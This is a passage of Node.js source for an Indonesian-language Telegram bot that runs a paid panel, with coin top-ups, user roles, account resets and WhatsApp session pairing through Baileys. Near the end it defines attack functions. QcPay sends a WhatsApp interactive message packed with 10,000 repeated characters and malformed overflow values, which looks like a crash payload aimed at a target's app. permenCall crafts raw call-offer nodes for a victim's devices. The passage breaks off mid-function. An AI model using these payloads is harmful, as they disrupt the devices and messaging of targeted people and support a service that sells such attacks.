    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

// ===== HANDLER CALLBACK UNTUK APPROVE/REJECT TOP UP =====
bot.on("callback_query", async (query) => {
  const data = query.data;
  const fromId = query.from.id;
  const chatId = query.message.chat.id;

  // Handle approve top up
  if (data.startsWith("approve_")) {
    if (fromId !== OWNER_ID) {
      return bot.answerCallbackQuery(query.id, { 
        text: "❌ Kamu tidak memiliki izin untuk ini.", 
        show_alert: true 
      });
    }

    const requestId = data.replace("approve_", "");
    const topupRequests = loadTopupRequests();
    const request = topupRequests.find(r => r.requestId === requestId && r.status === "pending");

    if (!request) {
      bot.answerCallbackQuery(query.id, { 
        text: "❌ Request ID tidak ditemukan atau sudah diproses.", 
        show_alert: true 
      });
      return bot.editMessageText(
        `❌ *Request ID: ${requestId}*\n\nRequest tidak ditemukan atau sudah diproses sebelumnya.`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "Markdown"
        }
      );
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === request.username);

    if (!user) {
      bot.answerCallbackQuery(query.id, { 
        text: "❌ User tidak ditemukan di database.", 
        show_alert: true 
      });
      return bot.editMessageText(
        `❌ *Request ID: ${requestId}*\n\nUser ${request.username} tidak ditemukan di database.`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "Markdown"
        }
      );
    }

    if (user.coins === undefined) user.coins = 0;
    
    const oldCoins = user.coins;
    user.coins += request.amount;
    saveDatabase(db);

    request.status = "approved";
    request.processedAt = new Date().toISOString();
    request.processedBy = query.from.username || query.from.first_name;
    saveTopupRequests(topupRequests);

    bot.editMessageText(
      `✅ *Top Up Berhasil Diproses*\n\n📋 Request ID: \`${requestId}\`\n👤 Username: ${user.username}\n💰 Coin: ${oldCoins} → ${user.coins} (+${request.amount})\n✓ Status: Approved\n👮 Diproses oleh: ${request.processedBy}\n⏰ Waktu: ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: "Markdown"
      }
    );

    bot.answerCallbackQuery(query.id, { text: "✅ Top up berhasil diproses!", show_alert: false });

    if (request.userId) {
      try {
        bot.sendMessage(request.userId, `✅ *Top Up Berhasil!*\n\n📋 Request ID: \`${requestId}\`\n💰 Jumlah: +${request.amount} coins\n💳 Saldo: ${oldCoins} → ${user.coins}\n\nTerima kasih telah melakukan top up!`, { parse_mode: "Markdown" });
      } catch (err) {
        console.log("Gagal kirim notifikasi ke user:", err.message);
      }
    }

    sendToGroupsUtama(`✅ *Top Up Berhasil*\n\n📋 Request ID: \`${requestId}\`\n👤 Username: ${user.username}\n💰 Jumlah: ${request.amount} coins\n💳 Saldo: ${oldCoins} → ${user.coins}\n👮 Diproses oleh: ${request.processedBy}\n⏰ Waktu: ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}`, { parse_mode: "Markdown" });

    const logLine = `${new Date().toISOString()} | TOPUP | ${request.processedBy} approved ${request.amount} coins for ${user.username} | Balance: ${oldCoins} → ${user.coins}\n`;
    fs.appendFileSync('logTopup.txt', logLine);
  }

  // Handle reject top up
  if (data.startsWith("reject_")) {
    if (fromId !== OWNER_ID) {
      return bot.answerCallbackQuery(query.id, { 
        text: "❌ Kamu tidak memiliki izin untuk ini.", 
        show_alert: true 
      });
    }

    const requestId = data.replace("reject_", "");
    const topupRequests = loadTopupRequests();
    const request = topupRequests.find(r => r.requestId === requestId && r.status === "pending");

    if (!request) {
      bot.answerCallbackQuery(query.id, { 
        text: "❌ Request ID tidak ditemukan atau sudah diproses.", 
        show_alert: true 
      });
      return bot.editMessageText(
        `❌ *Request ID: ${requestId}*\n\nRequest tidak ditemukan atau sudah diproses sebelumnya.`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "Markdown"
        }
      );
    }

    request.status = "rejected";
    request.processedAt = new Date().toISOString();
    request.processedBy = query.from.username || query.from.first_name;
    saveTopupRequests(topupRequests);

    bot.editMessageText(
      `❌ *Top Up Ditolak*\n\n📋 Request ID: \`${requestId}\`\n👤 Username: ${request.username}\n💰 Jumlah: ${request.amount} coins\n✗ Status: Rejected\n👮 Ditolak oleh: ${request.processedBy}\n⏰ Waktu: ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: "Markdown"
      }
    );

    bot.answerCallbackQuery(query.id, { text: "❌ Top up telah ditolak.", show_alert: false });

    if (request.userId) {
      try {
        bot.sendMessage(request.userId, `❌ *Top Up Ditolak*\n\n📋 Request ID: \`${requestId}\`\n💰 Jumlah: ${request.amount} coins\n\nRequest top up kamu telah ditolak. Silakan hubungi admin untuk informasi lebih lanjut.`, { parse_mode: "Markdown" });
      } catch (err) {
        console.log("Gagal kirim notifikasi ke user:", err.message);
      }
    }

    sendToGroupsUtama(`❌ *Top Up Ditolak*\n\n📋 Request ID: \`${requestId}\`\n👤 Username: ${request.username}\n💰 Jumlah: ${request.amount} coins\n👮 Ditolak oleh: ${request.processedBy}\n⏰ Waktu: ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}`, { parse_mode: "Markdown" });

    const logLine = `${new Date().toISOString()} | TOPUP | ${request.processedBy} rejected ${request.amount} coins for ${request.username}\n`;
    fs.appendFileSync('logTopup.txt', logLine);
  }
}); // ✅ TUTUP HANDLER APPROVE/REJECT

// ===== HANDLER CALLBACK UNTUK MENU BOT =====
bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:\n👤 Username: ${username}\n🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*\n${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:\n👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
}); 

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://104.236.12.4:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*NDX-07-5 Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Dheat_MD-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

bot.onText(/\/pairing (.+)/, async (msg, match) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const number = match[1];

  // Validasi format nomor
  if (!number || !number.match(/^\d+$/)) {
    return bot.sendMessage(chatId, "⚠️ Usage: /pairing <number>\nContoh: /pairing 6281234567890");
  }

  // Cek apakah user adalah VIP atau Owner
  const db = loadDatabase();
  const user = db.find(u => u.username === userId.toString());
  
  if (!user || !["vip", "owner"].includes(user.role)) {
    return bot.sendMessage(chatId, "❌ Command ini hanya untuk role VIP dan Owner!");
  }

  try {
    // Generate pairing code untuk nomor tersebut
    const sessionDir = path.join('permenmd', userId.toString(), number);
    
    if (!fs.existsSync(sessionDir)) {
      fs.mkdirSync(sessionDir, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    });

    sock.ev.on("creds.update", saveCreds);

    // Request pairing code
    await waiting(1000);
    let code = await sock.requestPairingCode(number);
    
    if (code) {
      bot.sendMessage(chatId, `✅ Pairing code untuk ${number}: \`${code}\`\n\nGunakan kode ini di WhatsApp untuk pairing.`, { parse_mode: "Markdown" });
    } else {
      bot.sendMessage(chatId, "❌ Gagal mendapatkan pairing code. Nomor ini mungkin sudah terdaftar.");
    }

    // Tutup koneksi sementara
    setTimeout(() => {
      sock.ws.close();
    }, 30000); // Tutup setelah 30 detik

  } catch (err) {
    console.error("❌ Error pairing:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat generate pairing code.");
  }
});

// === Fitur Track IP ===
bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    // Kirim peta lokasi (jika ada koordinat)
    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

// ===== Fitur reset akun by role =====
// Usage:
// 1) /resetakunmember        -> bot akan menanyakan konfirmasi
// 2) /resetakunmember yes    -> konfirmasi, lalu hapus semua akun role 'member'
// Sama untuk: resetakunowner, resetakunreseller, resetakunvip
// Untuk hapus semua akun: /resetall yes
// NOTE: hanya telegram owner (config.ownerList) yang boleh menjalankan.
// === FITUR RESET AKUN DENGAN BUTTON KONFIRMASI (HANYA ID KAMU) ===
// 🔐 Ganti dengan ID Telegram kamu

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}

function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

// 🔧 Fungsi utama hapus akun
function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

// 🔘 Command reset dengan tombol konfirmasi
function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  // Handle klik tombol konfirmasi
  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

// 🔹 Daftarkan semua perintah
registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

// === FITUR /INFO <username> ===
bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    // cari data akun
    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    // ambil data dari database.json
    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    // ambil data dari keyList.json
    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// === FITUR /STATS - STATUS BOT & USER ===
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    // === Load database user ===
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    // === Cek session WhatsApp aktif (jika pakai Baileys MD) ===
    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;

    // === Buat tampilan stats ===
    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    // Hitung berapa kali setiap user membuat akun
    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    // Gabungkan data username, role, dan total akun dibuat
    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    // Urutkan dari yang paling banyak membuat akun
    list.sort((a, b) => b.total - a.total);

    // Format teks file
    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath); // hapus file setelah dikirim
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH = path.join(__dirname, "permenmd");

// === Fitur /clearsession ===
bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    // Hapus seluruh isi folder permenmd
    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true }); // buat ulang folder kosong

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'permenmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      // Cek apakah folder berisi file .json
      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const coins = dbUser?.coins !== undefined ? dbUser.coins : 100;
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Coin:* 💰 ${coins}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// ===== FITUR RESTART MANUAL (SAMA GAYA DENGAN AUTO RESTART) =====
bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  sendToGroupsUtama("🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...", { parse_mode: "Markdown" });
  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
    sendToGroupsUtama("🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!", { parse_mode: "Markdown" });
  }, 8000); // kirim pesan sukses setelah 8 detik

  // Tunggu 5 detik lalu restart
  setTimeout(() => {
    process.exit(0);
  }, 5000);
});
// ===== Start Express Server =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://104.236.12.4:${PORT}`);
    startUserSessions()
});

// ===== AUTO RESTART PANEL DENGAN STATUS TELEGRAM =====
const RESTART_INTERVAL = 20 * 60 * 1000; // 20 menit

function kirimStatusServer(pesan) {
  try {
    sendToGroupsUtama(`🟣 *Status Panel:*\n${pesan}`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

// Kirim notifikasi saat server aktif
kirimStatusServer("✅ Server aktif dan berjalan normal.");

// Kirim notifikasi sebelum restart
setInterval(() => {
  kirimStatusServer("♻️ Panel akan *restart otomatis* untuk menjaga kestabilan...");
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0); // memicu restart otomatis di panel
  }, 5000); // beri jeda 5 detik agar pesan terkirim dulu
}, RESTART_INTERVAL);

async function QcPay(sock, target, zid = true) {
  const payload = "꧀".repeat(10000)
  const miaw = await generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      body: {
        text: payload
      },
      nativeFlowMessage: {
        messageVersion: 3,
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: payload,
              id: `detail`
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: payload,
              id: `ssss`
            })
          }

        ]
      },
      contextInfo: {
        conversionDelaySeconds: 9999,
        forwardingScore: 999999,
        isForwarded: true,
        participant: "0@s.whatsapp.net",
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: payload,
          contentType: 3,
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: 999e+21 * 999e+21
          }
        },
        remoteJid: "@s.whatsapp.net"
      }
    }
  }), {});

  await sock.relayMessage(target, miaw.message, zid ? { messageId: miaw.key.id, participant: { jid: target } } : { messageId: miaw.key.id });
  await sleep(10000);
}

async function permenCall(sock, toJid, isVideo = true) {
  try {
    const callId = crypto.randomBytes(16).toString('hex').toUpperCase().substring(0, 64);

    const callLayout = []
    const offerContent = [
      { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
      isVideo ? {
        tag: 'video',
        attrs: {
          enc: 'vp8',
          dec: 'vp8',
          orientation: '0',
          screen_width: '1920',
          screen_height: '1080',
          device_orientation: '0'
        }
      } : null,
      { tag: 'net', attrs: { medium: '3' } },
      { tag: 'capability', attrs: { ver: '1' }, content: Buffer.from([0x00, 0x00, 0x00, 0x00]) },
      { tag: 'encopt', attrs: { keygen: '2' } }
    ].filter(Boolean);

    callLayout.push({ tag: 'title', attrs: { ver: '1' }, content: 'PermenMD' })
    const encKey = crypto.randomBytes(32);
    const devices = (await sock.getUSyncDevices([toJid], true, false))
      .map(({ user, device }) => jidEncode(user, 's.whatsapp.net', device));

    await sock.assertSessions(devices, true);

    const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, {
      call: { callKey: new Uint8Array(encKey) }
    }, { count: '2' });

    offerContent.push({ tag: 'destination', attrs: {}, content: destinations });

